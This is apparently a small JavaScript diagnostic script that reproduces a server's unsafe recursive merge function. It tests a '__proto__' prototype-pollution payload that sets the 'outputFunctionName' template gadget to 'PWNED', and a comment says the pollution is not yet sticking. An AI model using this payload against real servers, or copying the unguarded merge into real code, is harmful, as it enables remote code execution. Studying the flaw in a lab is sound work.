
// Diagnostic Script
// This script simulates the backend logic exactly to see why pollution isn't sticking.

let userSettings = { theme: 'dark' };
const isObject = obj => obj && typeof obj === 'object'; // The current logic

// The current merge function in server.js
function merge(target, source) {
    for (const key in source) {
        if (source[key] && typeof source[key] === 'object') {
            if (!target[key]) target[key] = {};
            merge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}

const payload = {
    "__proto__": {
        "outputFunctionName": "PWNED"
    }
};

console.log("Before Pollution:", {}.outputFunctionName);
merge(userSettings, payload);
console.log("After Pollution:", {}.outputFunctionName);

if ({}.outputFunctionName === 'PWNED') {
    console.log("SUCCESS: Pollution logic is sound.");
} else {
    console.log("FAILURE: Pollution logic blocked.");
}
